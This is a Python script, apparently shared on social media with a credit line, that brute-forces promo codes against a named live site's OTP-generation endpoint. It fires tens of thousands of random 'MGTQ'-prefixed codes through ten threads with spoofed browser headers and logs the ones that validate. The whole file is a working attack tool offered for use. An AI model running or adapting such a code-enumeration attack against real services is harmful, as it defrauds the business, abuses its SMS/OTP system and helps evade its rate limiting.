import requests
import time
import random
import string
import json
import concurrent.futures
from typing import Dict
from threading import Lock

# ================== CONFIGURATION ==================
BASE_URL = "https://www.ssw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"
TEST_MOBILE = "7858565656" 

NUM_CODES = 99999             # Adjust as needed
MAX_WORKERS = 10             # 8-12 is optimal
DELAY_PER_THREAD = 0.7

print_lock = Lock()

def generate_random_code() -> str:
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    random_part = ''.join(random.choices(chars, k=6))
    return prefix + random_part


def check_code(code: str, mobile: str = TEST_MOBILE) -> Dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.ossw.theofferclub.in/",
        "Origin": "https://www.ossw.theofferclub.in",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    data = {"phone": mobile, "ccode": code}
    
    start_time = time.time()
    
    try:
        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=15)
        response_time = round((time.time() - start_time) * 1000, 2)
        
        result = {
            "code": code,
            "status_code": response.status_code,
            "response_time_ms": response_time,
            "raw_response": None,
            "valid": False,
            "message": "",
            "site_status": ""
        }
        
        if response.status_code == 200:
            try:
                json_resp = response.json()
                result["raw_response"] = json_resp
                result["site_status"] = json_resp.get("status", "unknown")
                
                if json_resp.get("status") == "success":
                    result["valid"] = True
                    result["message"] = "✅ VALID - OTP Sent Successfully"
                elif json_resp.get("status") == "failure":
                    msg = json_resp.get("msg1") or json_resp.get("msg") or "Unknown failure"
                    result["message"] = f"❌ {msg}"
                elif json_resp.get("status") == "code_failure":
                    result["message"] = f"❌ Invalid Code: {json_resp.get('msg', 'N/A')}"
                else:
                    result["message"] = f"❌ Unknown status: {json_resp.get('status')}"
            except:
                result["raw_response"] = response.text
                result["message"] = "❌ Failed to parse JSON"
        else:
            result["raw_response"] = response.text
            result["message"] = f"❌ HTTP Error {response.status_code}"
            
        return result
        
    except Exception as e:
        return {
            "code": code,
            "status_code": 0,
            "response_time_ms": round((time.time() - start_time) * 1000, 2),
            "raw_response": str(e),
            "valid": False,
            "message": f"❌ Request Error: {str(e)}",
            "site_status": "error"
        }


def process_code(code: str):
    result = check_code(code)
    
    with print_lock:
        print(f"\n🔍 Code: {code}")
        print(f"   Status : {result['message']}")
        print(f"   HTTP   : {result['status_code']} | Time: {result['response_time_ms']}ms")
        print(f"   Site Status: {result.get('site_status', 'N/A')}")
        
        # Show full response
        print("   Full Response:")
        if isinstance(result['raw_response'], dict):
            print(json.dumps(result['raw_response'], indent=2))
        else:
            resp_str = str(result['raw_response'])
            print(resp_str[:600] + "..." if len(resp_str) > 600 else resp_str)
        
        print("-" * 90)
        
        if result["valid"]:
            with open("valid_codes.txt", "a") as f:
                f.write(f"{code} | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            print(f"🎉🎉 VALID CODE FOUND: {code} 🎉🎉\n")
    
    time.sleep(DELAY_PER_THREAD)
    return result


def main():
    print("🚀 Oaksmith Multi-Threaded Code Generator & Validator")
    print("=" * 90)
    print(f"Generating {NUM_CODES} codes | Threads: {MAX_WORKERS} | Mobile: {TEST_MOBILE}")
    print("=" * 90)
    
    codes = [generate_random_code() for _ in range(NUM_CODES)]
    valid_codes = []
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_code, code) for code in codes]
        
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                if result["valid"]:
                    valid_codes.append(result["code"])
            except Exception as e:
                with print_lock:
                    print(f"Thread error: {e}")
    
    total_time = round(time.time() - start_time, 2)
    
    print("\n" + "="*90)
    print("🎯 FINAL SUMMARY")
    print("="*90)
    print(f"Total codes tested : {NUM_CODES}")
    print(f"Valid codes found  : {len(valid_codes)}")
    print(f"Total time         : {total_time} seconds")
    print(f"Average speed      : {round(NUM_CODES/total_time, 1)} codes/sec")
    
    if valid_codes:
        print("\n✅ VALID CODES FOUND:")
        for code in valid_codes:
            print(f"   → {code}")
    
    print(f"\nValid codes saved to: valid_codes.txt")


if __name__ == "__main__":
    main()
    
    
    
    
    #Made By Frozen @SpeakeMarin Share With Full Credit